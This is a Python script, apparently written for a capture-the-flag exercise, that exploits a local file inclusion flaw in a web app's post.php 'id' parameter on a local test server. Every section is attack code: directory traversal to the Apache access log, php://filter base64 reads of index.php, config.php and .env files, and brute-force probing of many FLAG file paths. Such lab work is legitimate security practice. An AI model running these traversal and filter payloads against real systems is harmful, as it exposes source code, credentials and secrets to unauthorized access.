import requests
import re

base_url = "http://127.0.0.1:32965/post.php"

print("=" * 60)
print("EXTENDED LFI TESTING - Finding FLAG.php")
print("=" * 60)

# First, let's check the working access log more thoroughly
print("\n[1] Examining access log content for clues...")
url = f"{base_url}?id=../../../../../../var/log/apache2/access.log"
resp = requests.get(url, timeout=10)
print(f"[STATUS] {resp.status_code} | Length: {len(resp.text)} bytes")

# Look for FLAG in the access logs
if "FLAG" in resp.text or "flag" in resp.text.lower():
    print("[!!!] FLAG found in access logs!")
    flag_matches = re.findall(r'.*[Ff][Ll][Aa][Gg].*', resp.text)
    for match in flag_matches[:10]:
        print(f"  {match}")
else:
    print("[INFO] No FLAG in access logs")

# The first test returned 0 bytes for post.php - let's examine index.php
print("\n" + "=" * 60)
print("[2] Reading index.php source code...")
print("=" * 60)

# Try reading index.php with base64 filter to bypass PHP execution
url = f"{base_url}?id=php://filter/convert.base64-encode/resource=../../../../../../var/www/html/index.php"
resp = requests.get(url, timeout=10)
print(f"[STATUS] {resp.status_code} | Length: {len(resp.text)} bytes")

if len(resp.text) > 1000 and "Post not found" not in resp.text:
    # Extract base64 content
    b64_match = re.search(r'([A-Za-z0-9+/]{100,}={0,2})', resp.text, re.DOTALL)
    if b64_match:
        import base64
        try:
            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
            print("[+] Index.php decoded:")
            print(decoded[:3000])
            
            # Look for include/require statements
            includes = re.findall(r'(include|require).*[\'"]([^\'"]+)[\'"]', decoded)
            if includes:
                print("\n[+] Include/Require statements found:")
                for inc in includes[:10]:
                    print(f"  {inc[0]}: {inc[1]}")
        except:
            print("[ERROR] Failed to decode base64")

# Try different paths for FLAG.php
print("\n" + "=" * 60)
print("[3] Testing various FLAG.php locations...")
print("=" * 60)

flag_paths = [
    "../../../../../../FLAG",
    "../../../../../../flag",
    "../../../../../../flag.php",
    "/var/www/FLAG.php",
    "/home/www-data/FLAG.php",
    "../../../../../../opt/FLAG.php",
    "../../../../../../root/FLAG.php",
    "../../../../../../home/FLAG.php",
    "../../../../../../usr/share/FLAG.php",
    "../../../../../../var/FLAG.php",
    "FLAG",
    "flag",
    "./FLAG",
    "flag.php",
]

for path in flag_paths:
    url = f"{base_url}?id={path}"
    try:
        resp = requests.get(url, timeout=10)
        # Check for PHP code or FLAG patterns
        if resp.status_code == 200 and len(resp.text) != 5326:  # 5326 is "Post not found" page length
            print(f"\n[!!!] UNUSUAL RESPONSE for: {path}")
            print(f"[STATUS] {resp.status_code} | Length: {len(resp.text)} bytes")
            if len(resp.text) < 5000:
                print(f"[CONTENT] {resp.text[:2000]}")
            else:
                # Might be PHP code, check for FLAG
                if "FLAG" in resp.text:
                    flag_lines = [line for line in resp.text.split('\n') if 'FLAG' in line]
                    print(f"[FLAG LINES] {flag_lines[:10]}")
    except Exception as e:
        pass

# Test reading common system locations
print("\n" + "=" * 60)
print("[4] Testing common system flag locations...")
print("=" * 60)

system_paths = [
    "../../../../../../etc/flag",
    "../../../../../../tmp/flag",
    "../../../../../../var/flag",
    "../../../../../../opt/flag",
    "../../../../../../flag.txt",
    "../../../../../../FLAG.txt",
]

for path in system_paths:
    url = f"{base_url}?id={path}"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200 and len(resp.text) != 5326 and len(resp.text) > 10:
            print(f"\n[!!!] FOUND POTENTIAL FLAG at: {path}")
            print(f"[CONTENT] {resp.text[:1000]}")
    except:
        pass

# Try reading config.php with base64 filter
print("\n" + "=" * 60)
print("[5] Reading config files with base64 filter...")
print("=" * 60)

config_paths = [
    "../../../../../../var/www/html/config.php",
    "../../../../../../var/www/html/.env",
    "../../../../../../var/www/.env",
]

for path in config_paths:
    url = f"{base_url}?id=php://filter/convert.base64-encode/resource={path}"
    try:
        resp = requests.get(url, timeout=10)
        if len(resp.text) > 100 and "Post not found" not in resp.text:
            b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', resp.text, re.DOTALL)
            if b64_match:
                import base64
                try:
                    decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                    print(f"\n[+] {path} decoded:")
                    print(decoded[:2000])
                    if "FLAG" in decoded:
                        print("\n[!!!] FLAG FOUND IN CONFIG!")
                except:
                    pass
    except:
        pass

# Check ALL files in /var/www/html
print("\n" + "=" * 60)
print("[6] Enumerating files in web root via base64 encoding...")
print("=" * 60)

test_files = [
    ".htaccess",
    ".env",
    "setup.php",
    "install.php",
    "database.php",
    "connection.php",
    "FLAG",
    "flag",
]

for filename in test_files:
    path = f"../../../../../../var/www/html/{filename}"
    url = f"{base_url}?id={path}"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200 and len(resp.text) != 5326:
            print(f"\n[!!!] FILE EXISTS: {filename}")
            print(f"[LENGTH] {len(resp.text)} bytes")
            if "FLAG" in resp.text or "flag" in resp.text.lower():
                print(f"[CONTENT] {resp.text[:1000]}")
    except:
        pass

print("\n" + "=" * 60)
print("ENUMERATION COMPLETE")
print("=" * 60)

